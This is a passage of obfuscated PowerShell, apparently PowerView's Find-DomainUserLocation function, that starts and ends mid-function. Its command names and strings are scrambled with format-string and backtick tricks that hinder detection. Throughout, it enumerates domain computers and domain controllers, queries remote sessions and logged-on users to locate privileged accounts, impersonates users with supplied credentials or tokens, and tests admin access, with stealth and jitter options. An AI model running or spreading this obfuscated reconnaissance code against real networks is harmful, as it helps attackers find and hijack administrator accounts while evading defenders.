        if (${pS`B`O`UNdp`ArAmEtErs}[("{2}{3}{1}{0}" -f'e','Bas','ComputerSea','rch')]) { ${cOmpUTeRSE`ARC`H`ERaR`gUmEnTs}[("{3}{0}{2}{1}"-f'e','rchBase','a','S')] = ${CoMpU`T`ERseARchbA`sE} }
        if (${pSBOuNDpaR`AM`e`T`e`Rs}[("{1}{0}{3}{2}" -f 'nstr','Unco','ined','a')]) { ${CoMpUTErsEAR`C`HE`R`ARG`UMe`NtS}[("{0}{1}{2}"-f'Un','constr','ained')] = ${UnC`oN`STrA`ineD} }
        if (${P`SB`OUn`dParamet`erS}[("{2}{1}{0}{6}{4}{3}{7}{5}" -f'u','omp','C','pe','O','ystem','ter','ratingS')]) { ${coMputerSEAr`cHera`RGU`mE`NtS}[("{1}{4}{3}{2}{0}"-f 'm','Oper','ngSyste','ti','a')] = ${oP`eRatinG`s`Y`STem} }
        if (${PS`BOUNd`Pa`R`AmETErS}[("{3}{0}{2}{1}"-f'terServ','ck','icePa','Compu')]) { ${Co`mPUTe`Rs`eA`RCH`ERarGu`mEnts}[("{0}{2}{1}"-f'S','rvicePack','e')] = ${S`eRvi`cE`pAcK} }
        if (${PSB`o`UndPar`AMeT`ers}[("{3}{1}{0}{2}"-f 'mputerSite','o','Name','C')]) { ${CoMpU`T`ersEArC`heRAR`g`U`meNts}[("{0}{2}{1}"-f 'Si','ame','teN')] = ${SiTE`N`AMe} }
        if (${P`SbouNDPAR`AmE`TeRs}[("{1}{0}" -f 'r','Serve')]) { ${com`P`U`Ters`earCh`eRArgUMEN`Ts}[("{2}{0}{1}" -f 'e','rver','S')] = ${S`Erv`Er} }
        if (${pS`B`OU`NdpaRAmEt`E`Rs}[("{0}{2}{1}"-f 'SearchS','ope','c')]) { ${c`oM`pU`TerSear`C`heraRgum`E`NtS}[("{0}{2}{1}"-f'Se','cope','archS')] = ${S`ea`R`CHsCoPE} }
        if (${P`SBOUN`DPA`R`AMEters}[("{2}{0}{1}{3}" -f'sult','Page','Re','Size')]) { ${ComP`UTErsE`ARCh`Er`ArGUmE`NTS}[("{0}{2}{3}{1}"-f'R','geSize','esult','Pa')] = ${rE`sUltpA`geSize} }
        if (${PsBO`Undp`AR`AME`T`ERs}[("{0}{2}{3}{1}"-f 'S','mit','erver','TimeLi')]) { ${COm`pute`R`SE`A`RcheRAR`gumENTS}[("{1}{3}{2}{4}{0}"-f'meLimit','S','rver','e','Ti')] = ${seR`V`ER`TImELIm`It} }
        if (${p`sbOUndP`ARAm`eT`ERS}[("{0}{1}{2}"-f'Tombs','to','ne')]) { ${Co`Mp`UTer`SeAR`C`hera`RguMEn`Ts}[("{2}{1}{0}" -f 'stone','b','Tom')] = ${t`O`MBSTONe} }
        if (${Ps`BOUND`Pa`Ra`MeteRS}[("{2}{0}{1}" -f'redenti','al','C')]) { ${C`O`mpu`TErs`E`ARcHe`RArGU`mENTs}[("{0}{2}{3}{1}"-f'C','al','rede','nti')] = ${cre`dent`iAl} }

        ${users`EaRcHErarG`UmeN`Ts} = @{
            ("{1}{0}{2}" -f'rti','Prope','es') = ("{2}{0}{1}" -f'acc','ountname','sam')
        }
        if (${P`SBounDp`Ara`mE`TeRS}[("{3}{0}{1}{2}"-f'i','t','y','UserIdent')]) { ${uSE`Rs`E`Ar`cH`erArGuM`enTS}[("{1}{2}{0}" -f 'ity','Id','ent')] = ${U`sERidEN`TI`Ty} }
        if (${ps`Bo`UnDP`ARAM`EtE`Rs}[("{1}{0}" -f 'in','Doma')]) { ${USE`RSeaR`CHE`Ra`RgU`Me`NTS}[("{1}{0}" -f 'main','Do')] = ${DOm`AIn} }
        if (${P`SBOunD`pArAM`e`TeRS}[("{2}{1}{0}" -f 'ain','m','UserDo')]) { ${USeR`SE`ARcherargUm`eN`TS}[("{1}{0}"-f'ain','Dom')] = ${use`RdOma`In} }
        if (${pSbOuND`pAram`E`TeRS}[("{1}{3}{2}{0}" -f'ter','U','rLDAPFil','se')]) { ${uSErsE`ARCHEr`A`RGU`MEnts}[("{2}{0}{1}" -f 'ilte','r','LDAPF')] = ${uS`E`RlDaPfI`ltER} }
        if (${pS`B`OundP`A`RAMETE`Rs}[("{3}{1}{0}{2}"-f'rchBas','ea','e','UserS')]) { ${us`eR`SeArch`ERA`RG`UMeN`Ts}[("{3}{1}{0}{2}" -f'Bas','h','e','Searc')] = ${U`SErSEA`RcHBa`se} }
        if (${PSBOuNdpa`RAm`e`TerS}[("{2}{3}{4}{1}{0}" -f 't','oun','U','se','rAdminC')]) { ${uSeRS`earChe`RA`RGU`Me`NTs}[("{2}{0}{1}" -f'n','t','AdminCou')] = ${U`SeraDMInCo`UNT} }
        if (${PsbOun`dp`ARam`EterS}[("{4}{1}{0}{5}{3}{2}" -f 'Deleg','llow','on','i','UserA','at')]) { ${uS`ER`se`ArcHERaRgume`NtS}[("{0}{3}{1}{2}{4}"-f'All','i','o','owDelegat','n')] = ${US`e`RAl`loWd`eL`EGati`on} }
        if (${psb`OUnd`pARa`mETe`Rs}[("{0}{1}"-f 'S','erver')]) { ${uS`er`SE`ARCHE`RAR`GUm`ENTS}[("{1}{0}{2}"-f'e','Serv','r')] = ${SeR`VEr} }
        if (${pSb`O`UNdPARamET`Ers}[("{1}{0}{2}"-f'earchScop','S','e')]) { ${usErSEA`RCH`E`RaRgu`MeNTs}[("{2}{1}{0}"-f'e','hScop','Searc')] = ${s`EA`Rchs`Cope} }
        if (${PsB`OunDpA`RaM`EtErs}[("{2}{3}{1}{0}"-f 'e','z','Resu','ltPageSi')]) { ${uSers`EA`RCHeRar`GU`meNTs}[("{1}{0}{2}" -f 'ltP','Resu','ageSize')] = ${R`ES`UlTPAG`eS`IZe} }
        if (${psBO`Un`dParAmET`e`Rs}[("{2}{0}{1}"-f 'erverTimeLimi','t','S')]) { ${u`SerSeA`RcHera`R`gumenTS}[("{3}{1}{2}{0}"-f't','m','eLimi','ServerTi')] = ${serveRtImE`L`i`miT} }
        if (${pS`BOUn`DPara`mETers}[("{0}{1}"-f 'Tomb','stone')]) { ${uSerS`EAr`CHe`R`ArGUMentS}[("{2}{3}{0}{1}" -f'n','e','To','mbsto')] = ${tOm`BSTO`Ne} }
        if (${PSboU`NDP`ArAm`eT`Ers}[("{0}{1}{2}" -f 'Creden','t','ial')]) { ${uSERs`EarCHer`ARGum`e`NTS}[("{1}{0}{2}" -f'dent','Cre','ial')] = ${Cr`edE`NTIAL} }

        ${TARGET`com`Pu`TE`RS} = @()

        if (${PSb`oUn`d`PArAMetErs}[("{2}{0}{1}{3}"-f 'uterNa','m','Comp','e')]) {
            ${TA`R`Ge`TcoMPutE`Rs} = @(${coMp`Uter`NA`me})
        }
        else {
            if (${ps`B`OuNdpAram`eteRS}[("{2}{0}{1}"-f 'l','th','Stea')]) {
                &("{2}{0}{1}" -f'te-Verbos','e','Wri') ('[F'+'i'+'nd-D'+'oma'+'in'+'User'+'Lo'+'cation] '+'Stealth'+' '+'enum'+'e'+'ration '+'us'+'i'+'ng '+'sou'+'r'+'ce: '+"$StealthSource")
                ${t`ARgE`T`COmPu`Ter`A`RRAyLisT} = &("{1}{2}{0}" -f'ject','Ne','w-Ob') ("{3}{2}{5}{0}{4}{1}" -f'oll','ist','tem','Sys','ections.ArrayL','.C')

                if (${ST`e`Al`TH`SOUrCe} -match ((("{2}{1}{0}" -f 'll','ileLn2A','F')) -Creplace'Ln2',[chAR]124)) {
                    &("{1}{3}{0}{2}" -f 'Ve','Wr','rbose','ite-') ("{0}{6}{1}{4}{5}{7}{3}{8}{2}"-f '[Fin','tio','ers','le ','n] Qu','er','d-DomainUserLoca','ying for fi','serv')
                    ${fi`L`ESer`VErSE`Arc`H`E`RA`RGUMENTs} = @{}
                    if (${psBOU`NDp`ArA`MeTerS}[("{1}{0}" -f 'omain','D')]) { ${fileSERverse`Ar`cher`Ar`GuMENTS}[("{0}{2}{1}" -f 'Do','ain','m')] = ${D`oMa`iN} }
                    if (${psbO`UNDpAr`A`metErS}[("{2}{0}{1}" -f'erDom','ain','Comput')]) { ${Fi`leSERVers`E`ARc`HERar`gu`ME`Nts}[("{0}{1}" -f 'Doma','in')] = ${C`OM`put`erDOmAIn} }
                    if (${P`sbOUNDpAra`MeTe`Rs}[("{3}{2}{4}{0}{1}{5}" -f 'erSe','ar','o','C','mput','chBase')]) { ${fILesERV`E`Rsea`R`ChERArGUmeNTs}[("{1}{2}{0}"-f'Base','S','earch')] = ${C`oMpUt`Er`seA`R`chBASe} }
                    if (${Ps`BO`UNDPa`RamE`TE`Rs}[("{2}{0}{1}"-f'rv','er','Se')]) { ${fI`lES`Er`VeRseA`RcHER`A`RGUm`ENTs}[("{1}{2}{0}" -f'er','Se','rv')] = ${sE`R`VeR} }
                    if (${PsBO`U`NDpAr`Am`eTeRs}[("{0}{1}{2}" -f'S','earchSc','ope')]) { ${f`ilESeRVErse`ARcheR`A`Rgu`me`NTS}[("{2}{1}{0}"-f 'pe','o','SearchSc')] = ${seAR`CHSco`pE} }
                    if (${Ps`BoU`Nd`paRAMete`Rs}[("{0}{3}{4}{2}{1}"-f'Resul','e','geSiz','t','Pa')]) { ${FI`leServ`er`s`e`ARCH`eR`ARguMEN`Ts}[("{0}{4}{3}{2}{1}"-f 'Re','ize','geS','ultPa','s')] = ${RESulTp`AG`esi`Ze} }
                    if (${p`S`BoUnDp`ARAmE`TErS}[("{3}{2}{0}{1}"-f'TimeL','imit','rver','Se')]) { ${fileSErVe`Rsea`RCH`E`RA`RgumEnTs}[("{1}{0}{3}{2}"-f 'rve','Se','Limit','rTime')] = ${SerV`eR`TIM`eL`imIt} }
                    if (${p`SbOundparame`Te`Rs}[("{0}{1}{2}" -f 'To','mbs','tone')]) { ${filESe`Rver`S`e`ARcheRarGu`MenTs}[("{2}{0}{1}"-f'om','bstone','T')] = ${t`oMbs`TONe} }
                    if (${PsBOU`NDparaM`E`TERS}[("{2}{0}{1}{3}" -f'edenti','a','Cr','l')]) { ${f`IlEs`E`R`VE`R`Se`ArcHerARgumenTs}[("{2}{1}{0}" -f 'ntial','ede','Cr')] = ${c`Red`enTiAL} }
                    ${FILES`erv`E`RS} = &("{1}{0}{2}{3}"-f 'ma','Get-Do','inFileSe','rver') @FileServerSearcherArguments
                    if (${FIL`EServ`erS} -isnot [System.Array]) { ${f`ilEs`ErverS} = @(${Fi`leS`erverS}) }
                    ${tA`RG`ETCO`m`pUtEraRRayList}.("{0}{1}{2}"-f'A','d','dRange').Invoke( ${fIlE`sER`VeRS} )
                }
                if (${sTEaL`T`H`SoUr`ce} -match ((("{0}{1}{3}{2}" -f 'DFS','M','All','z1'))."rePl`AcE"(([chAR]77+[chAR]122+[chAR]49),'|'))) {
                    &("{2}{0}{1}"-f'os','e','Write-Verb') ("{12}{9}{0}{1}{8}{3}{10}{2}{11}{6}{5}{4}{7}"-f 'erL','o','on] ','t','r DFS serv','ng fo','ueryi','ers','ca','ind-DomainUs','i','Q','[F')

                }
                if (${st`e`AL`ThsOURCe} -match ((("{2}{1}{0}"-f 'All','C{0}','D')) -f[char]124)) {
                    &("{1}{4}{0}{2}{3}" -f 'e-','W','Verbos','e','rit') ("{7}{4}{1}{10}{3}{11}{5}{2}{6}{0}{8}{9}" -f'co','mainUserLocation',' d','Quer','o',' for','omain ','[Find-D','n','trollers','] ','ying')
                    ${DcsEAr`ch`ER`AR`GuMEn`Ts} = @{
                        ("{0}{1}"-f 'L','DAP') = ${t`Rue}
                    }
                    if (${psb`O`UnDpa`RAMeTE`RS}[("{0}{1}"-f'Do','main')]) { ${dCS`EARcHeRA`RGUME`NtS}[("{0}{1}"-f 'Doma','in')] = ${dO`MAIn} }
                    if (${PSB`ouND`PArAm`eters}[("{2}{3}{1}{0}" -f 'ain','om','Com','puterD')]) { ${D`Cs`eAR`ChErarGumenTS}[("{1}{0}"-f'main','Do')] = ${C`ompU`TerDo`m`AiN} }
                    if (${pSb`Ou`N`DPa`RA`MeTeRS}[("{1}{0}{2}"-f 'e','S','rver')]) { ${dC`SE`ArCh`E`RARgUmentS}[("{0}{1}" -f'S','erver')] = ${Se`R`Ver} }
                    if (${psb`Ou`Nd`ParAMe`TerS}[("{0}{1}{2}" -f 'Cre','de','ntial')]) { ${DCse`A`R`C`HERarg`UmenTS}[("{2}{0}{1}" -f'ia','l','Credent')] = ${CredEn`T`IaL} }
                    ${dO`mAiNCoNt`Ro`LLers} = &("{5}{1}{2}{4}{0}{3}" -f'ntro','et-Do','mai','ller','nCo','G') @DCSearcherArguments | &("{0}{1}{4}{2}{3}" -f 'Sel','e','t-O','bject','c') -ExpandProperty ("{1}{2}{0}{3}" -f 't','d','nshos','name')
                    if (${do`mA`InCOnt`Ro`llERS} -isnot [System.Array]) { ${dOmAIn`c`oNtr`OLleRS} = @(${dOm`A`INcONt`R`oLlERS}) }
                    ${TA`RG`Et`COm`PutErA`RRa`ylISt}.("{0}{1}" -f'AddRan','ge').Invoke( ${DoMa`Inco`NTro`lL`ers} )
                }
                ${taRge`TC`Om`PuteRS} = ${TARg`EtcOM`P`UTer`ARr`Ay`LIst}.("{1}{0}" -f 'ray','ToAr').Invoke()
            }
            else {
                &("{3}{0}{1}{4}{2}"-f 'it','e-V','rbose','Wr','e') ("{8}{5}{1}{6}{9}{4}{7}{0}{3}{10}{2}"-f' in ','cat','n','the do','ng for all c','mainUserLo','ion]','omputers','[Find-Do',' Queryi','mai')
                ${TARg`ET`coMPU`TerS} = &("{3}{1}{0}{2}" -f 'inC','a','omputer','Get-Dom') @ComputerSearcherArguments | &("{4}{3}{1}{2}{0}"-f'ject','t-O','b','elec','S') -ExpandProperty ("{0}{2}{1}"-f'dns','tname','hos')
            }
        }
        &("{0}{3}{2}{1}"-f'Write','se','erbo','-V') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "
        if (${TarGeT`cO`MPUteRS}."Le`NGth" -eq 0) {
            throw ("{0}{10}{2}{1}{3}{6}{5}{9}{4}{8}{7}" -f '[Fin','rLoc','-DomainUse','a','sts fou','] ','tion','merate','nd to enu','No ho','d')
        }

        if (${P`SB`Ou`NDP`AraM`eterS}[("{2}{0}{1}{3}"-f'nt','ia','Crede','l')]) {
            ${CURrENT`US`eR} = ${cr`EDe`Nti`Al}.("{0}{3}{4}{1}{2}" -f 'GetNetwork','a','l','Credent','i').Invoke()."US`Er`NamE"
        }
        else {
            ${c`U`RrenTUseR} = (  ${B`9U}::"u`se`RNAmE").("{1}{0}"-f 'Lower','To').Invoke()
        }

        if (${pS`BouNdPaR`Ame`T`ERS}[("{2}{0}{1}"-f'howAl','l','S')]) {
            ${TARg`E`TUS`ErS} = @()
        }
        elseif (${PsB`oUN`d`p`Ara`mEterS}[("{2}{1}{3}{0}" -f 'ity','se','U','rIdent')] -or ${pS`B`oundp`ARAMETe`RS}[("{1}{3}{2}{0}" -f 'r','U','Filte','serLDAP')] -or ${PSBoU`NDpaR`AmEtE`RS}[("{0}{1}{4}{3}{2}" -f 'UserSe','a','hBase','c','r')] -or ${pSBOUNdPaR`A`MeTe`Rs}[("{0}{3}{2}{1}"-f'Us','nt','nCou','erAdmi')] -or ${P`s`Bou`NDPARAM`EteRs}[("{5}{1}{3}{4}{0}{2}"-f 'g','l','ation','low','Dele','UserA')]) {
            ${t`Arge`TUsERS} = &("{0}{4}{1}{3}{2}" -f 'Ge','o','ainUser','m','t-D') @UserSearcherArguments | &("{1}{0}{2}" -f '-O','Select','bject') -ExpandProperty ("{2}{1}{3}{4}{0}" -f 'ntname','ama','s','cc','ou')
        }
        else {
            ${G`Ro`UPSearchE`R`AR`gUm`Ents} = @{
                ("{1}{0}"-f 'entity','Id') = ${us`E`Rgro`U`PIdEN`TiTy}
                ("{1}{0}" -f'ecurse','R') = ${T`Rue}
            }
            if (${PS`BO`UN`dP`ArAmeTerS}[("{2}{1}{0}"-f 'n','Domai','User')]) { ${gROuPs`e`Arc`HerA`RgU`m`eNTS}[("{1}{0}" -f'main','Do')] = ${uS`erDom`Ain} }
            if (${p`SbOu`NDPArAme`TERS}[("{2}{1}{0}" -f'archBase','e','UserS')]) { ${GrOUPseARC`HeraR`gum`eN`Ts}[("{0}{1}{2}" -f 'S','ear','chBase')] = ${uSEr`Sea`Rchb`Ase} }
            if (${Ps`B`o`UNDParaMEte`RS}[("{1}{0}" -f 'er','Serv')]) { ${GR`ouPSearche`RARg`U`MENTS}[("{0}{2}{1}" -f 'Se','r','rve')] = ${s`E`Rver} }
            if (${PsbouN`Dpa`R`Ame`TE`RS}[("{1}{0}{2}"-f 'chSc','Sear','ope')]) { ${GROUps`Ea`RCheraR`G`UMen`TS}[("{2}{0}{1}"-f 'archSc','ope','Se')] = ${SEar`cHs`CoPE} }
            if (${p`sbOuNDpa`RAmE`T`eRs}[("{1}{3}{0}{4}{2}" -f 'tPag','Res','ze','ul','eSi')]) { ${g`R`ou`pSea`RCheraRGuM`ents}[("{2}{0}{3}{1}" -f'ult','Size','Res','Page')] = ${resU`Lt`pAges`iZE} }
            if (${pSBoUn`DPaR`Amet`E`Rs}[("{4}{0}{2}{1}{3}"-f'rver','imeL','T','imit','Se')]) { ${G`RO`UPsEARCHErArGU`M`EnTS}[("{4}{1}{2}{3}{0}" -f 'it','rve','rTim','eLim','Se')] = ${sE`R`VERt`i`MeliM`it} }
            if (${PsB`OU`Ndp`ArA`meTe`RS}[("{0}{1}" -f 'Tombston','e')]) { ${grOUp`s`eaRC`HeR`A`R`gU`MEnTS}[("{0}{2}{1}"-f'T','mbstone','o')] = ${ToM`BSTo`Ne} }
            if (${pS`BOU`NDp`A`RaM`eTErS}[("{0}{2}{1}" -f 'Cr','tial','eden')]) { ${gROU`PSe`Ar`c`HERaR`gUMe`NTs}[("{1}{0}{3}{2}"-f'r','C','dential','e')] = ${CrE`de`Nt`Ial} }
            ${T`ArgeT`Us`ers} = &("{3}{5}{2}{4}{1}{0}"-f'er','b','omai','Ge','nGroupMem','t-D') @GroupSearcherArguments | &("{0}{2}{3}{1}"-f 'S','t','ele','ct-Objec') -ExpandProperty ("{2}{1}{0}" -f 'me','emberNa','M')
        }

        &("{1}{3}{2}{0}" -f'bose','Write','Ver','-') "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length) "
        if ((-not ${S`hOw`AlL}) -and (${T`A`RGEtUseRS}."LeN`g`TH" -eq 0)) {
            throw ("{1}{2}{4}{14}{9}{7}{5}{0}{13}{8}{11}{6}{3}{12}{10}"-f 'er','[Find-Dom','ainU','o','s',' us','d t','cation] No',' f','Lo','rget','oun',' ta','s','er')
        }

        ${H`oSTe`NU`m`BlOCk} = {
            Param(${C`OmpuTER`NamE}, ${tA`RG`eTuSerS}, ${cur`R`en`TUsEr}, ${STe`ALth}, ${t`o`KEnHanD`lE})

            if (${tO`kEN`HA`Ndle}) {

                ${n`ULl} = &("{4}{2}{3}{1}{0}" -f 'ion','t','serImpe','rsona','Invoke-U') -TokenHandle ${TOk`En`haN`DLe} -Quiet
            }

            ForEach (${tA`R`geTCO`M`PuTEr} in ${C`OMPUtERNA`me}) {
                ${Up} = &("{1}{0}{3}{4}{2}" -f'-C','Test','n','onnec','tio') -Count 1 -Quiet -ComputerName ${T`ARGEtCOMp`Ut`Er}
                if (${U`P}) {
                    ${s`e`s`SiOns} = &("{1}{2}{0}{3}" -f 'essi','Get-N','etS','on') -ComputerName ${TarGeT`CO`MPuTEr}
                    ForEach (${Se`S`SiON} in ${sEs`sio`Ns}) {
                        ${U`s`eRNaMe} = ${se`SSION}."USER`N`AMe"
                        ${cN`AMe} = ${SeS`sI`On}."C`NamE"

                        if (${c`NaMe} -and ${cn`A`Me}.("{3}{0}{2}{1}" -f'a','ith','rtsW','St').Invoke('\\')) {
                            ${c`N`Ame} = ${Cn`AME}.("{1}{2}{0}" -f'rt','Tri','mSta').Invoke('\')
                        }

                        if ((${u`s`ERNAME}) -and (${useR`NAmE}.("{1}{0}" -f'im','Tr').Invoke() -ne '') -and (${u`sERnA`mE} -notmatch ${CU`RreN`T`USEr}) -and (${uSern`A`me} -notmatch '\$$')) {

                            if ( (-not ${ta`RG`eTU`seRS}) -or (${targetU`S`ers} -contains ${uSe`Rna`mE})) {
                                ${UsE`RloCA`TioN} = &("{1}{3}{2}{0}"-f'ject','New','Ob','-') ("{1}{0}{2}" -f'bjec','PSO','t')
                                ${U`sERLocat`Ion} | &("{0}{1}{2}"-f 'Ad','d-M','ember') ("{3}{0}{1}{2}"-f'e','prope','rty','Not') ("{1}{0}{2}"-f'Do','User','main') ${nU`LL}
                                ${Use`R`LOCa`TIon} | &("{0}{2}{1}" -f 'Ad','er','d-Memb') ("{3}{2}{1}{0}"-f 'rty','e','oteprop','N') ("{2}{1}{0}"-f 'ame','N','User') ${u`SernAME}
                                ${USERlOC`At`iON} | &("{1}{0}{2}" -f'd-','Ad','Member') ("{3}{2}{0}{1}"-f 'roper','ty','p','Note') ("{1}{0}{2}" -f'omputerNam','C','e') ${tA`RGET`CoMpu`TER}
                                ${u`SE`RlocATion} | &("{2}{0}{1}"-f'-M','ember','Add') ("{2}{1}{0}" -f'operty','epr','Not') ("{1}{2}{0}" -f 'm','Session','Fro') ${C`NaMe}

                                try {
                                    ${cNa`MeDn`sNaME} =   (  &('LS') ("VARIabl"+"e:A"+"d"+"1"))."vA`Lue"::("{2}{0}{1}{3}"-f'tHo','s','Ge','tEntry').Invoke(${C`NaME}) | &("{3}{1}{0}{2}"-f'Objec','t-','t','Selec') -ExpandProperty ("{2}{1}{0}" -f 'me','stNa','Ho')
                                    ${Use`RLO`caT`IoN} | &("{3}{1}{2}{0}"-f'ember','dd','-M','A') ("{1}{2}{3}{0}"-f'erty','N','oteP','rop') ("{1}{3}{0}{2}"-f 'sionFrom','S','Name','es') ${C`NAmEdn`sna`Me}
                                }
                                catch {
                                    ${U`SERlO`cA`TIon} | &("{0}{3}{2}{1}" -f'Ad','er','Memb','d-') ("{2}{1}{0}" -f'Property','ote','N') ("{4}{0}{1}{2}{3}"-f 'ssi','onFro','mNa','me','Se') ${NU`LL}
                                }

                                if (${cHe`CkAc`CEsS}) {
                                    ${AdM`in} = (&("{2}{0}{1}"-f '-AdminAc','cess','Test') -ComputerName ${cn`AMe})."I`Sa`DmIN"
                                    ${U`se`RlOCa`TiON} | &("{2}{0}{1}" -f 'dd-Me','mber','A') ("{2}{0}{1}{3}"-f 'op','ert','Notepr','y') ("{1}{0}{2}" -f 'a','Loc','lAdmin') ${aDM`in}."I`saDmin"
                                }
                                else {
                                    ${u`SErL`oc`AtI`oN} | &("{1}{2}{0}"-f'er','Add-M','emb') ("{0}{1}{2}" -f'Notepro','pe','rty') ("{1}{0}{2}" -f'calA','Lo','dmin') ${N`ULl}
                                }
                                ${u`se`R`l`OCatioN}."pSOBj`ECt"."Ty`pEna`MES".("{1}{0}"-f'rt','Inse').Invoke(0, ("{4}{3}{0}{1}{2}" -f'ew.U','se','rLocation','erVi','Pow'))
                                ${uSERLo`c`AtIoN}
                            }
                        }
                    }
                    if (-not ${s`TEAL`Th}) {

                        ${l`oGge`Don} = &("{4}{0}{2}{1}{3}" -f't-Ne','Logg','t','edon','Ge') -ComputerName ${tA`R`GeTC`oMpuT`Er}
                        ForEach (${U`SeR} in ${LO`G`gEDoN}) {
                            ${us`eR`N`AmE} = ${us`ER}."Us`Ername"
                            ${UsERd`OM`AIn} = ${US`eR}."LO`GoNdo`MaIN"

                            if ((${u`seRNa`ME}) -and (${USe`RNaMe}.("{1}{0}"-f 'rim','t').Invoke() -ne '')) {
                                if ( (-not ${t`ARgetUsE`RS}) -or (${t`ArG`E`TuSErs} -contains ${us`eRna`me}) -and (${UseRN`Ame} -notmatch '\$$')) {
                                    ${i`PaDDR`EsS} = @(&("{3}{2}{1}{0}"-f 'dress','PAd','solve-I','Re') -ComputerName ${TA`R`GE`TcOmPutEr})[0]."IP`AD`dresS"
                                    ${use`R`LO`catIOn} = &("{1}{2}{0}" -f 'Object','Ne','w-') ("{1}{2}{0}"-f'ct','P','SObje')
                                    ${usErLOC`Ati`ON} | &("{2}{1}{0}" -f'ber','d-Mem','Ad') ("{1}{2}{0}{3}"-f'tepro','N','o','perty') ("{0}{1}{2}" -f 'U','serDom','ain') ${U`S`Erd`OMAIN}
                                    ${Us`ERLoc`At`I`ON} | &("{0}{2}{1}{3}"-f'Add-M','be','em','r') ("{0}{1}{3}{2}"-f 'Notepr','o','y','pert') ("{1}{0}" -f'me','UserNa') ${U`SER`NaME}
                                    ${UsErlo`cat`IoN} | &("{1}{0}{3}{2}"-f'-M','Add','er','emb') ("{2}{3}{1}{0}" -f'perty','pro','N','ote') ("{1}{0}{3}{2}"-f'puterN','Com','e','am') ${tar`g`eT`CoM`PUTeR}
                                    ${Use`RLOcA`TI`On} | &("{2}{1}{0}"-f'er','b','Add-Mem') ("{2}{1}{3}{0}"-f 'ty','oteprope','N','r') ("{1}{2}{0}"-f 's','IP','Addres') ${iP`A`dDr`EsS}
                                    ${u`SER`Lo`CATion} | &("{1}{0}{2}" -f'e','Add-M','mber') ("{1}{2}{3}{0}" -f'erty','N','ot','eprop') ("{1}{3}{2}{0}"-f 'rom','Se','nF','ssio') ${N`UlL}
                                    ${UsE`R`Locat`IoN} | &("{0}{1}{2}" -f 'Ad','d-','Member') ("{3}{2}{0}{1}"-f'opert','y','r','Notep') ("{0}{2}{1}{4}{3}" -f'S','o','essi','romName','nF') ${N`UlL}

                                    if (${cHE`CK`ACCESs}) {
                                        ${a`d`MIn} = &("{0}{2}{3}{1}"-f'Test-','nAccess','Adm','i') -ComputerName ${Targ`Etc`oM`puTER}
                                        ${u`se`RLoCA`T`IoN} | &("{1}{2}{0}" -f 'er','Add-','Memb') ("{2}{3}{1}{0}"-f'ty','eproper','N','ot') ("{2}{0}{1}" -f'al','Admin','Loc') ${a`Dm`iN}."IsaD`MiN"
                                    }
                                    else {
                                        ${us`ERLO`CAt`IoN} | &("{1}{0}{2}" -f 'dd-','A','Member') ("{3}{0}{1}{2}" -f'rop','e','rty','Notep') ("{3}{1}{0}{2}" -f 'd','A','min','Local') ${N`UlL}
                                    }
                                    ${Use`RlOc`AT`ion}."Ps`OBJE`CT"."tYp`En`AM`eS".("{1}{0}" -f 't','Inser').Invoke(0, ("{5}{2}{4}{3}{1}{6}{0}"-f 'cation','r','r','.Use','View','Powe','Lo'))
                                    ${USeR`loc`AtIOn}
                                }
                            }
                        }
                    }
                }
            }

            if (${T`okEnHa`N`dLe}) {
                &("{1}{2}{3}{0}" -f'tToSelf','I','nvok','e-Rever')
            }
        }

        ${Lo`Gont`Oken} = ${NU`Ll}
        if (${psboUnd`PA`RaMe`TeRS}[("{1}{0}{2}" -f 'eden','Cr','tial')]) {
            if (${pSB`Ou`Nd`pAraMeT`erS}[("{0}{1}" -f 'De','lay')] -or ${pS`BoU`Ndp`AraMeTERS}[("{4}{2}{0}{1}{3}" -f 'o','pOnSucc','t','ess','S')]) {
                ${LO`gontok`EN} = &("{4}{2}{1}{0}{3}" -f 'erImpersonati','s','e-U','on','Invok') -Credential ${c`REdE`NtIAL}
            }
            else {
                ${LOgo`NtO`kEn} = &("{6}{0}{5}{4}{3}{1}{2}"-f'vo','na','tion','UserImperso','-','ke','In') -Credential ${C`R`eD`eNTial} -Quiet
            }
        }
    }

    PROCESS {

        if (${pSB`O`UnDPAr`AMe`TE`Rs}[("{1}{0}"-f 'elay','D')] -or ${pSBo`U`NdPA`Ram`ETE`RS}[("{1}{3}{2}{0}"-f's','StopOnSuc','s','ce')]) {

            &("{1}{3}{2}{0}"-f'e','Write-','bos','Ver') "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count) "
            &("{2}{3}{1}{0}"-f 'bose','ite-Ver','W','r') ('[Find-Doma'+'inUser'+'Lo'+'catio'+'n] '+'Dela'+'y: '+"$Delay, "+'Jitt'+'er'+': '+"$Jitter")
            ${c`oUN`TeR} = 0
            ${r`An`dnO} = &("{1}{0}{2}" -f'ew-Ob','N','ject') ("{2}{1}{4}{3}{0}"-f 'om','em','Syst','nd','.Ra')

            ForEach (${T`Arg`EtCOmp`UTeR} in ${Ta`RGetCO`M`puTers}) {
                ${cOu`NT`Er} = ${cO`UNT`ER} + 1

                &("{2}{0}{1}{3}" -f'r','t-S','Sta','leep') -Seconds ${r`ANd`No}.("{1}{0}" -f 't','Nex').Invoke((1-${JI`TT`er})*${DEL`Ay}, (1+${j`I`Tter})*${D`eLAY})

                &("{2}{1}{3}{4}{0}" -f'e','e-','Writ','Verbo','s') "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count)) "
                &("{1}{4}{0}{2}{3}"-f'om','Invok','m','and','e-C') -ScriptBlock ${hOsTeNuMB`L`OCK} -ArgumentList ${ta`RgE`TcoMP`UTEr}, ${t`ArGEtU`s`eRS}, ${CURr`e`NTUsEr}, ${St`eAl`Th}, ${LOgO`NtOk`En}

                if (${RE`S`UlT} -and ${stOpoNS`U`CCE`Ss}) {
                    &("{1}{0}{2}"-f'i','Wr','te-Verbose') ("{4}{5}{8}{6}{0}{11}{12}{9}{10}{2}{3}{1}{7}" -f'g','urnin','e','t','[Find-','Do',' Tar','g early','mainUserLocation]','fo','und, r','et user',' ')
                    return
                }
            }
        }
        else {
            &("{0}{1}{2}{3}" -f'Wr','ite-V','erbos','e') ('[Fi'+'nd-Do'+'ma'+'in'+'UserL'+'ocation]'+' '+'U'+'sing'+' '+'thr'+'ea'+'ding '+'with'+' '+'threa'+'ds'+': '+"$Threads")
            &("{2}{3}{0}{1}" -f'ite-Verbos','e','W','r') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "

            ${s`c`Ri`PtPar`AmS} = @{
